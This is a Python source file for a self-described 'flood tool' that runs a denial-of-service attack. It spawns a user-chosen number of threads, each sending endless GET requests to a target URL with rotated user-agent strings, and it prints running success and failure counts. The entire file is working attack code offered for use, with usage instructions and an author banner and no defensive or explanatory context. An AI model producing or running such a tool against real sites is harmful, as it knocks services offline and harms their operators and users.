import os
import sys
import threading
import requests
import random
import time
from colorama import Fore, init

init(autoreset=True)
os.system('clear')

print(Fore.CYAN + '''
███████╗ █████╗ ██████╗ ██╗  ██╗ █████╗ ██████╗     ██████╗██████╗ ██╗   ██╗██████╗ ███████╗██╗  ██╗
██╔════╝██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██║   ██║██╔══██╗██╔════╝██║ ██╔╝
█████╗  ███████║██████╔╝█████╔╝ ███████║██║  ██║    ██║     ██████╔╝██║   ██║██████╔╝█████╗  █████╔╝ 
██╔══╝  ██╔══██║██╔═══╝ ██╔═██╗ ██╔══██║██║  ██║    ██║     ██╔═══╝ ██║   ██║██╔═══╝ ██╔══╝  ██╔═██╗ 
██║     ██║  ██║██║     ██║  ██╗██║  ██║██████╔╝    ╚██████╗██║     ╚██████╔╝██║     ███████╗██║  ██╗
╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝      ╚═════╝╚═╝      ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝

         FARHAD CRYPTEX - CRX STYLE FLOOD TOOL v2.1 (FAST - GET ONLY)
         Author: FarHad CrypteX | GitHub: osmangani097
''')

if len(sys.argv) < 3:
    print(Fore.YELLOW + "Usage: python3 FarHadCrypteX.py <url> <threads>")
    print(Fore.YELLOW + "Example: python3 FarHadCrypteX.py https://example.com 500")
    sys.exit()

url = sys.argv[1]
threads = int(sys.argv[2])

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)"
]

success = 0
failed = 0
start_time = time.time()

def attack():
    global success, failed
    session = requests.Session()
    while True:
        try:
            headers = {
                'User-Agent': random.choice(user_agents),
                'Connection': 'keep-alive'
            }
            response = session.get(url, headers=headers, timeout=3)
            if response.status_code < 400:
                success += 1
            else:
                failed += 1
        except:
            failed += 1

def stats():
    while True:
        time.sleep(2)
        uptime = int(time.time() - start_time)
        print(Fore.GREEN + f"[STATS] Sent: {success} | Failed: {failed} | Uptime: {uptime}s")

print(Fore.CYAN + f"[!] Launching attack on {url} using {threads} threads with GET method.\n")
threading.Thread(target=stats, daemon=True).start()

for _ in range(threads):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()

while True:
    time.sleep(1)